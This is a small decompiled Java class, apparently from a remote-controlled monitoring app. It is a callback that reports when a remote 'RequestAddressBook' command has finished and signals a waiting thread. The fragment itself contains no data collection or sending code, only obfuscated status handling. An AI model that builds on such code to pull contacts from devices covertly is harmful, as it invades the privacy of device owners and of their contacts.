package com.vvt.appengine.a;

import android.os.ConditionVariable;
import com.vvt.addressbookmanager.a;
import com.vvt.datadeliverymanager.i;
import com.vvt.remotecontrol.output.RmtCtrlOutputStatusMessage;

class aw
  implements a
{
  aw(av paramav) {}
  
  public void a()
  {
    boolean bool1 = av.a();
    if (bool1) {}
    Object localObject = av.a(this.a);
    boolean bool2 = true;
    ((RmtCtrlOutputStatusMessage)localObject).setSuccess(bool2);
    localObject = av.a(this.a);
    String str = "RequestAddressBook command is complete";
    ((RmtCtrlOutputStatusMessage)localObject).setMessage(str);
    localObject = av.b(this.a);
    ((ConditionVariable)localObject).open();
    bool1 = av.a();
    if (bool1) {}
  }
  
  public void a(i parami)
  {
    boolean bool1 = av.a();
    if (bool1) {}
    Object localObject = av.a(this.a);
    boolean bool2 = parami.f();
    ((RmtCtrlOutputStatusMessage)localObject).setSuccess(bool2);
    localObject = av.a(this.a);
    String str = parami.e();
    ((RmtCtrlOutputStatusMessage)localObject).setMessage(str);
    localObject = av.b(this.a);
    ((ConditionVariable)localObject).open();
    bool1 = av.a();
    if (bool1) {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/aw.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */